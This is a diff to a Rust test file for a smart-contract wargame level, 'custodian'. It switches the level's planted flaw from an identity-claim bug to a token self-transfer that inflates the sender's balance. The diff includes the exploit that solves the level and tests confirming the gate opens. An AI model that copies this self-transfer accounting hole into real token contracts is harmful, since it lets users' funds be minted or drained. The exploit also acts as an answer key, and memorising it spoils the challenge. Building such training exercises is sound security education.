@@ -6,60 +6,57 @@ pub const SPEC: LevelSpec = LevelSpec {
     slug: "custodian",
     interface: &[
         "__constructor",
+        "amount",
+        "balance",
         "caller",
-        "claim_identity",
-        "controller",
-        "current_controller",
         "enter",
+        "from",
         "gate_open",
-        "identity",
-        "new_controller",
-        "operator_identity",
+        "owner",
         "player",
+        "threshold",
+        "to",
+        "transfer",
     ],
 };
 
 #[allow(dead_code)]
 #[contractclient(name = "CustodianClient")]
 pub trait CustodianInterface {
-    fn operator_identity(env: Env) -> u32;
-    fn controller(env: Env, identity: u32) -> Address;
-    fn claim_identity(
-        env: Env,
-        identity: u32,
-        current_controller: Address,
-        new_controller: Address,
-    );
-    fn enter(env: Env, identity: u32, caller: Address);
+    fn balance(env: Env, owner: Address) -> i128;
+    fn threshold(env: Env) -> i128;
+    fn transfer(env: Env, from: Address, to: Address, amount: i128);
+    fn enter(env: Env, caller: Address);
     fn gate_open(env: Env, caller: Address) -> bool;
 }
 
-fn claim(c: &Scenario, instance: &Address, identity: u32, current: &Address, next: &Address) {
+fn transfer(c: &Scenario, instance: &Address, from: &Address, to: &Address, amount: i128) {
     CustodianClient::new(&c.env, instance)
         .mock_auths(&[auth(
-            next,
+            from,
             instance,
-            "claim_identity",
-            (identity, current.clone(), next.clone()).into_val(&c.env),
+            "transfer",
+            (from.clone(), to.clone(), amount).into_val(&c.env),
         )])
-        .claim_identity(&identity, current, next);
+        .transfer(from, to, &amount);
 }
 
-fn enter(c: &Scenario, instance: &Address, identity: u32, caller: &Address) {
+fn enter(c: &Scenario, instance: &Address, caller: &Address) {
     CustodianClient::new(&c.env, instance)
         .mock_auths(&[auth(
             caller,
             instance,
             "enter",
-            (identity, caller.clone()).into_val(&c.env),
+            (caller.clone(),).into_val(&c.env),
         )])
-        .enter(&identity, caller);
+        .enter(caller);
 }
 
 pub(crate) fn exploit(c: &Scenario, instance: &Address, player: &Address) {
-    let identity = CustodianClient::new(&c.env, instance).operator_identity();
-    claim(c, instance, identity, instance, player);
-    enter(c, instance, identity, player);
+    let client = CustodianClient::new(&c.env, instance);
+    let amount = client.threshold() - client.balance(player);
+    transfer(c, instance, player, player, amount);
+    enter(c, instance, player);
 }
 
 #[test]
@@ -68,14 +65,9 @@ fn the_objective_is_not_met_at_the_start() {
     let custodian = c.create_instance(&c.player, SPEC.id);
     let client = CustodianClient::new(&c.env, &custodian);
 
-    let identity = client.operator_identity();
-    assert_eq!(
-        client.controller(&identity),
-        custodian,
-        "the operator identity starts with the sealed system"
-    );
-    assert!(!client.gate_open(&c.player), "the gate starts closed");
-
+    assert_eq!(client.balance(&c.player), 1);
+    assert_eq!(client.threshold(), 256);
+    assert!(!client.gate_open(&c.player));
     assert_eq!(
         c.submit(&c.player, &custodian),
         Err(contract_error(errors::OBJECTIVE_NOT_MET)),
@@ -84,65 +76,63 @@ fn the_objective_is_not_met_at_the_start() {
 }
 
 #[test]
-fn the_exploit_makes_the_custodian_believe_in_the_player() {
+fn a_self_transfer_inflates_the_balance_and_opens_the_gate() {
     let c = Scenario::new();
     let custodian = c.create_instance(&c.player, SPEC.id);
 
     exploit(&c, &custodian, &c.player);
 
     let client = CustodianClient::new(&c.env, &custodian);
-    let identity = client.operator_identity();
-    assert_eq!(client.controller(&identity), c.player);
+    assert_eq!(client.balance(&c.player), 256);
     assert!(client.gate_open(&c.player));
-
     assert_eq!(c.submit(&c.player, &custodian), Ok(()));
     assert!(c.is_completed(&c.player, SPEC.id));
 }
 
 #[test]
-fn the_identity_cannot_be_claimed_with_a_wrong_current_controller() {
+fn a_transfer_requires_the_source_auth_and_a_positive_funded_amount() {
     let c = Scenario::new();
     let custodian = c.create_instance(&c.player, SPEC.id);
     let client = CustodianClient::new(&c.env, &custodian);
-    let identity = client.operator_identity();
 
-    let result = client
-        .mock_auths(&[auth(
-            &c.player,
-            &custodian,
-            "claim_identity",
-            (identity, c.other.clone(), c.player.clone()).into_val(&c.env),
-        )])
-        .try_claim_identity(&identity, &c.other, &c.player);
-    assert!(
-        result.is_err(),
-        "the stored controller is the Custodian, not an arbitrary address"
-    );
-    assert_eq!(client.controller(&identity), custodian);
-}
-
-#[test]
-fn the_gate_only_opens_for_the_controller() {
-    let c = Scenario::new();
-    let custodian = c.create_instance(&c.player, SPEC.id);
-    let client = CustodianClient::new(&c.env, &custodian);
-    let identity = client.operator_identity();
-
-    claim(&c, &custodian, identity, &custodian, &c.player);
-
-    let result = client
+    let unauthorized = client
         .mock_auths(&[auth(
             &c.other,
             &custodian,
-            "enter",
-            (identity, c.other.clone()).into_val(&c.env),
+            "transfer",
+            (c.player.clone(), c.other.clone(), 1_i128).into_val(&c.env),
         )])
-        .try_enter(&identity, &c.other);
-    assert!(
-        result.is_err(),
-        "a correct Core Gate refuses a caller that does not control the identity"
-    );
-    assert!(!client.gate_open(&c.other));
+        .try_transfer(&c.player, &c.other, &1);
+    assert!(unauthorized.is_err());
+    assert_eq!(client.balance(&c.player), 1);
+
+    assert!(client
+        .mock_auths(&[auth(
+            &c.player,
+            &custodian,
+            "transfer",
+            (c.player.clone(), c.player.clone(), 0_i128).into_val(&c.env),
+        )])
+        .try_transfer(&c.player, &c.player, &0)
+        .is_err());
+}
+
+#[test]
+fn the_gate_stays_closed_until_the_threshold_is_met() {
+    let c = Scenario::new();
+    let custodian = c.create_instance(&c.player, SPEC.id);
+    let client = CustodianClient::new(&c.env, &custodian);
+
+    assert!(client
+        .mock_auths(&[auth(
+            &c.player,
+            &custodian,
+            "enter",
+            (c.player.clone(),).into_val(&c.env),
+        )])
+        .try_enter(&c.player)
+        .is_err());
+    assert!(!client.gate_open(&c.player));
 }
 
 #[test]
